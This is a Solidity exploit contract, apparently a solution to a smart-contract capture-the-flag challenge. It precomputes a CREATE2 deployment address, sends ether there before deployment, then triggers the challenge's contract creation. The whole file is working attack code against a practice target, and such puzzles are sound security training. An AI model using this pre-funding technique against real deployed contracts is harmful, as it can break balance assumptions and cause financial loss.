// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "./Challenge.sol";
import "hardhat/console.sol";

contract Exploit {
    Challenge instance;

    constructor(Challenge _instance) payable {
        instance = _instance;
    }

    function getAddress(address factory, uint256 _salt)
        public
        view
        returns (address)
    {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(factory),
                _salt,
                keccak256(type(Test).creationCode)
            )
        );

        // NOTE: cast last 20 bytes of hash to address
        return address(uint160(uint256(hash)));
    }

    function finalize(address factory, uint256 _salt) external payable {
        address preAddress = getAddress(factory, _salt);
        console.log("PRE ADDRESS", preAddress);
        payable(preAddress).transfer(msg.value);
        instance.createContract(type(Test).creationCode, _salt);
    }

    receive() external payable {}
}

contract Test {}
